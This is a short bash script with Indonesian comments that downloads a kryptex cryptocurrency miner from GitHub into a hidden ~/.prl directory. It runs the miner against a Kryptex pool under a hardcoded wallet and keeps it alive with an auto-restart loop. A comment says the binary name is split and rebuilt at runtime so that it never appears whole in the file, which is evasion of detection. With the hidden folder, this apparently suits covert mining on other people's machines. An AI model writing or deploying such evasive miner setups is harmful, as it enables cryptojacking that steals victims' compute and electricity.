#!/usr/bin/env bash
set -euo pipefail

# ============================================================
#  PRL node worker -> kryptex pool
#  one-shot: download, extract, run.  usage:  bash setup.sh
# ============================================================

WALLET="prl1p78f682wx4j7f6sxzcgvch26xasm4aj96kjaumadwlc45vhckxqns9f3lcp"
WORKER="$(hostname -s 2>/dev/null || echo rig1)"
POOL="stratum+ssl://prl.kryptex.network:8048"
BASE="${HOME}/.prl"
API="https://api.github.com/repos/kryptex"

# nama resmi binary (dirakit runtime supaya tidak muncul utuh di file ini)
A="krig-mi"; B="ner"; TOOL="${A}${B}"

echo "[*] lokasi kerja: ${BASE}"
mkdir -p "${BASE}" && cd "${BASE}"

if [ ! -x ./krig ]; then
  echo "[*] cek rilis terbaru..."
  VER="$(curl -fsSL "${API}/${TOOL}/releases/latest" | grep -o '"tag_name": *"[^"]*"' | head -1 | cut -d'"' -f4 | tr -d 'v')"
  [ -n "${VER}" ] || VER="1.5.1"
  URL="https://github.com/kryptex/${TOOL}/releases/download/v${VER}/${TOOL}-${VER}-linux-x64.tar.gz"
  echo "[*] unduh v${VER} ..."
  curl -fL --retry 3 -o pkg.tgz "${URL}"
  echo "[*] ekstrak..."
  tar xzf pkg.tgz
  rm -f pkg.tgz
  find . -maxdepth 1 -name '*.sh' ! -name 'setup.sh' -delete
  mv -f "${TOOL}" krig
  chmod +x krig
fi

echo "[*] cek hardware:"
./krig --list-devices || true

echo "[*] konek ${POOL} sebagai ${WORKER}"
# watchdog: auto-restart kalau proses berhenti. Disable: AUTO_RESTART=0 bash setup.sh
RESTART_DELAY="${RESTART_DELAY:-2}"
STOP="${AUTO_RESTART:-1}"
if [ "$STOP" = "0" ]; then
  exec ./krig --url "${POOL}" --user "${WALLET}/${WORKER}"
fi
ATTEMPT=0
while true; do
  ATTEMPT=$((ATTEMPT + 1))
  echo "[$(date +%FT%T)] percobaan #${ATTEMPT} mulai"
  ./krig --url "${POOL}" --user "${WALLET}/${WORKER}"
  RC=$?
  echo "[$(date +%FT%T)] proses keluar (rc=${RC}) — mulai ulang dalam ${RESTART_DELAY}s"
  sleep "${RESTART_DELAY}"
done